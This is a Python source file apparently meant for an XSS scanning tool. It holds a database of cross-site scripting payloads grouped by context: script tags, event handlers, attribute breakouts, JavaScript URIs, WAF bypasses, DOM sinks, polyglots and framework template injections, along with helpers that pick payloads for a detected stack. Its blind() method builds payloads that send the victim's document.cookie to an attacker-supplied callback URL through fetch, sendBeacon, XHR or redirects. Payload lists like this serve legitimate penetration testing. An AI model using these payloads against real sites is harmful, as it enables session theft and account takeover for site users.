"""
XSS Payload Database
Source: PortSwigger Web Security Cheat Sheet + extended research payloads
"""

import random
import string


class PayloadDB:

    # ── Basic Script Tags ────────────────────────────────────────────────────
    BASIC = [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<script >alert(1)</script >",
        "<script\t>alert(1)</script>",
        "<script\n>alert(1)</script>",
        "<script/**/src=data:,alert(1)></script>",
        '<<script>alert(1)//<</script>',
    ]

    # ── Event Handler Payloads ────────────────────────────────────────────────
    EVENT_HANDLERS = [
        # img
        "<img src=x onerror=alert(1)>",
        "<img src=1 onerror=alert(1)>",
        "<img/src=x onerror=alert(1)>",
        "<img src=x oNErRoR=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=alert(document.domain)>",
        # body / html
        "<body onload=alert(1)>",
        "<body/onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>",
        "<body onresize=alert(1)>",
        "<body onhashchange=alert(1)><a href=#x>click",
        "<body onscroll=alert(1)><br>"*10,
        # svg
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><script>alert&#40;1&#41;</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set attributeName=x onbegin=alert(1) dur=1s>",
        "<svg><discard onbegin=alert(1)>",
        "<svg><image href=1 onerror=alert(1)>",
        "<svg><a><animate attributeName=href values=javascript:alert(1)/><text y=15>Click</text></a></svg>",
        # input / form elements
        "<input autofocus onfocus=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<form><button formaction=javascript:alert(1)>click",
        # video / audio
        "<video><source onerror=alert(1)>",
        "<video onerror=alert(1)><source>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<audio><source onerror=alert(1)>",
        # details / marquee
        "<details open ontoggle=alert(1)>XSS</details>",
        "<details/open/ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>XSS",
        # object / embed / iframe
        "<object data=javascript:alert(1)>",
        "<object/data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<iframe onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        '<iframe srcdoc="<img src=x onerror=alert(1)>">',
        # links / anchors
        "<a href=javascript:alert(1)>click</a>",
        "<a href='javascript:alert(1)'>click</a>",
        '<a href="javascript:alert(1)">click</a>',
        # mouse / interaction
        "<div onmouseover=alert(1)>hover</div>",
        "<div onclick=alert(1)>click</div>",
        "<button onclick=alert(1)>click</button>",
        # math / xml
        "<math><a xlink:href=javascript:alert(1)>click</a></math>",
        "<math><annotation-xml encoding=application/xhtml+xml><script xmlns=http://www.w3.org/1999/xhtml>alert(1)</script></annotation-xml></math>",
        # style / link
        "<style>*{background:url(javascript:alert(1))}</style>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        # animation CSS
        "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>",
        "<div style=animation-name:x onanimationstart=alert(1)>",
        # picture / canvas
        "<picture><source srcset=1 onerror=alert(1)>",
        "<canvas onmousedown=alert(1)>click",
        # input type image
        "<input type=image src=1 onerror=alert(1)>",
        # base
        "<base href=javascript:alert(1)//>",
        # table
        "<table background=javascript:alert(1)>",
        "<td background=javascript:alert(1)>",
    ]

    # ── Attribute Context Breakout ────────────────────────────────────────────
    ATTR_BREAKOUT = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)',
        "' onclick='alert(1)",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '" onerror="alert(1)" src="x',
        "' onerror='alert(1)' src='x",
        '"/><script>alert(1)</script>',
        "'/><script>alert(1)</script>",
        '"autofocus/onfocus=alert(1)//',
        "'autofocus/onfocus=alert(1)//",
        '`onmouseover=alert(1)`',
        '"><svg/onload=alert(1)>',
        "' onpointerover='alert(1)",
        '" onpointerover="alert(1)',
        '" onanimationstart="alert(1)" style="animation-name:x',
        "' onanimationstart='alert(1)' style='animation-name:x",
        '" ontransitionend="alert(1)" style="transition:0s',
        "' ontransitionend='alert(1)' style='transition:0s",
    ]

    # ── JavaScript URI ────────────────────────────────────────────────────────
    JAVASCRIPT_URI = [
        "javascript:alert(1)",
        "javascript:alert(document.cookie)",
        "javascript:alert(document.domain)",
        "JaVaScRiPt:alert(1)",
        "JAVASCRIPT:alert(1)",
        "javascript&#58;alert(1)",
        "javascript&#x3A;alert(1)",
        "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
        "java\tscript:alert(1)",
        "java\nscript:alert(1)",
        "java\rscript:alert(1)",
        "java&#9;script:alert(1)",
        "java&#10;script:alert(1)",
        "java&#13;script:alert(1)",
        "  javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:msgbox(1)",
    ]

    # ── Filter / WAF Bypass ───────────────────────────────────────────────────
    FILTER_BYPASS = [
        # Double / Triple URL encoding
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "%3C%73%63%72%69%70%74%3Ealert(1)%3C/%73%63%72%69%70%74%3E",
        # HTML entity
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        # Null bytes
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<scr\u0000ipt>alert(1)</scr\u0000ipt>",
        # Comment injection
        "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
        "<!--<script>-->alert(1)<!--</script>-->",
        "<![CDATA[><script>alert(1)</script><!]]>",
        # Case variation
        "<ScRiPt>alert(1)</ScRiPt>",
        "<sCrIpT>alert(1)</sCrIpT>",
        "<Script>alert(1)</Script>",
        # Whitespace / tab substitution
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\rsrc=x\ronerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        # JS string concatenation
        "<script>eval('ale'+'rt(1)')</script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>setTimeout('alert(1)',0)</script>",
        "<script>setInterval('alert(1)',0)</script>",
        "<script>Function('alert(1)')()</script>",
        "<script>new Function(`alert(1)`)()</script>",
        # Property access bypass
        "<script>window['alert'](1)</script>",
        "<script>this['alert'](1)</script>",
        "<script>top['alert'](1)</script>",
        "<script>self['alert'](1)</script>",
        "<script>globalThis['alert'](1)</script>",
        # fromCharCode
        "<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        # Unicode escape
        "<script>\u0061\u006C\u0065\u0072\u0074(1)</script>",
        "<script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029</script>",
        # Hex escape
        "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>",
        # Template literals
        "<script>alert`1`</script>",
        "<script>alert`${document.domain}`</script>",
        # Comment in JS
        "<script>alert(1//comment\n)</script>",
        "<script>/**/alert(1)/**/</script>",
        # WAF bypass patterns
        "<img src=x onerror=alert(1) x>",
        "<svg><script>alert(1)//</script></svg>",
        "<script>window.onerror=alert;throw 1</script>",
        "<script>{alert(1)}</script>",
        "<script>void(alert(1))</script>",
        "<script>throw{toString(){alert(1)}}</script>",
    ]

    # ── DOM-Based XSS ─────────────────────────────────────────────────────────
    DOM_BASED = [
        # Hash injection
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "#javascript:alert(1)",
        "%23<script>alert(1)</script>",
        # JS context breakout
        "'-alert(1)-'",
        '"-alert(1)-"',
        "';alert(1)//",
        '";alert(1)//',
        "\\';alert(1)//",
        '\\"alert(1)//',
        "1;alert(1)",
        "1'alert(1)",
        "</script><script>alert(1)</script>",
        # innerHTML sinks
        "<img src=x onerror=alert(document.domain)>",
        # eval injection
        "1;alert(document.cookie);1",
        "0;alert(document.domain)",
        # location sinks
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        # postMessage
        "<script>window.opener.postMessage('<img src=x onerror=alert(1)>','*')</script>",
    ]

    # ── Polyglot Payloads ─────────────────────────────────────────────────────
    POLYGLOT = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
        "'>\"<img/onerror=alert(1) src=>",
        "'\"><img src=/ onerror=alert(document.domain)>",
        "\"><img src=x id=x onerror=alert(1)>",
        "\"><img src=x onerror=alert(document.cookie)>",
        "\">'><img src=x onerror=alert(1)>",
        "<script>alert('XSS')//",
        "<!--<script>alert(1)//-->",
        "<!--<img src=x onerror=alert(1)>-->",
        "<svg/onload=&{[alert]}()>",
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        # The classic polyglot
        ("';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"
         '";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//'
         '--></SCRIPT>">\'>'),
    ]

    # ── Framework-Specific Payloads ───────────────────────────────────────────
    FRAMEWORK = {
        "angular": [
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            "[[constructor.constructor('alert(1)')()]]",
            "<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
            "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
            "{{7*'7'}}",  # SSTI probe
            "{{1+1}}",    # Template injection probe
        ],
        "react": [
            "dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<img src={'javascript:alert(1)'}/>",
        ],
        "vue": [
            "{{constructor.constructor('alert(1)')()}}",
            "v-html=\"'<img src=x onerror=alert(1)>'\"",
            "{{$parent.$el.ownerDocument.defaultView.alert(1)}}",
        ],
        "wordpress": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "/?s=<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
        ],
        "django": [
            "{{7*7}}",
            "{{''.class.mro()[1].subclasses()}}",
            "<script>alert(1)</script>",
        ],
        "php": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
        ],
        "asp.net": [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<img src=x onerror=alert(1)>",
        ],
        "java/jsp": [
            "<script>alert(1)</script>",
            "${\"<script>alert(1)</script>\"}",
            "<%= \"<script>alert(1)</script>\" %>",
        ],
        "ruby": [
            "<script>alert(1)</script>",
            "<%= raw '<script>alert(1)</script>' %>",
        ],
        "next.js": [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
        ],
    }

    # ── Blind / OOB Payloads ──────────────────────────────────────────────────
    @staticmethod
    def blind(callback_url: str) -> list:
        cb = callback_url.rstrip("/")
        return [
            f"<script>fetch('{cb}?c='+document.cookie)</script>",
            f"<script>new Image().src='{cb}?c='+document.cookie</script>",
            f"<img src=x onerror=\"fetch('{cb}?d='+document.domain)\">",
            f"<script>navigator.sendBeacon('{cb}',document.cookie)</script>",
            f"<script>var x=new XMLHttpRequest();x.open('GET','{cb}?c='+btoa(document.cookie));x.send()</script>",
            f"\"><script>fetch('{cb}/x?c='+btoa(document.cookie))</script>",
            f"'><img src=x onerror=fetch('{cb}/x?d='+document.domain)>",
            f"<script>document.location='{cb}?c='+document.cookie</script>",
        ]

    @classmethod
    def all_generic(cls) -> list:
        """All non-framework, non-blind payloads — deduplicated."""
        seen, out = set(), []
        for group in [cls.BASIC, cls.EVENT_HANDLERS, cls.ATTR_BREAKOUT,
                      cls.JAVASCRIPT_URI, cls.FILTER_BYPASS, cls.DOM_BASED,
                      cls.POLYGLOT]:
            for p in group:
                if p not in seen:
                    seen.add(p)
                    out.append(p)
        return out

    @classmethod
    def for_stack(cls, tech_stack: list) -> list:
        """Framework-specific payloads for detected technologies."""
        seen, out = set(), []
        for tech in tech_stack:
            tl = tech.lower()
            for key, plist in cls.FRAMEWORK.items():
                if key in tl:
                    for p in plist:
                        if p not in seen:
                            seen.add(p)
                            out.append(p)
        return out

    @staticmethod
    def tokenize(payload: str, token: str) -> str:
        """Replace alert(1) with a trackable token for reflection detection."""
        return (payload
                .replace("alert(1)", f"alert('{token}')")
                .replace("alert(document.domain)", f"alert('{token}')")
                .replace("alert(document.cookie)", f"alert('{token}')"))

    @staticmethod
    def make_token() -> str:
        """Short, unique token embedded in payloads to track reflection."""
        chars = string.ascii_uppercase + string.digits
        return "XSS" + "".join(random.choices(chars, k=5))
